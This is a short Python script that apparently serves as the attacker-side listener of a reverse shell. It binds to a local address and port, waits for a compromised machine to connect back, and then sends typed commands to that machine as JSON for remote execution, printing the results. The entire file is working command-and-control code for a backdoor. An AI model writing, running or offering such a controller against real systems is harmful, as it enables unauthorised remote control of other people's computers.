#!/usr/bin/env python
import socket, json


class Listener:
    def __init__(self, ip, port):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((ip, port))
        self.listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.client, self.addr = self.listener.accept()
        print("[+] Got new connection: "+str(self.addr))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.client.send(bytes(json_data, 'utf-8'))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.client.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        return self.reliable_receive()

    def run(self):
        while True:
            command = input("[Command]>>")
            result = self.execute_remotely(command)
            print(result)
        self.listener.close()



if __name__ == '__main__':
    listener = Listener("192.168.0.100", 8080)
    listener.run()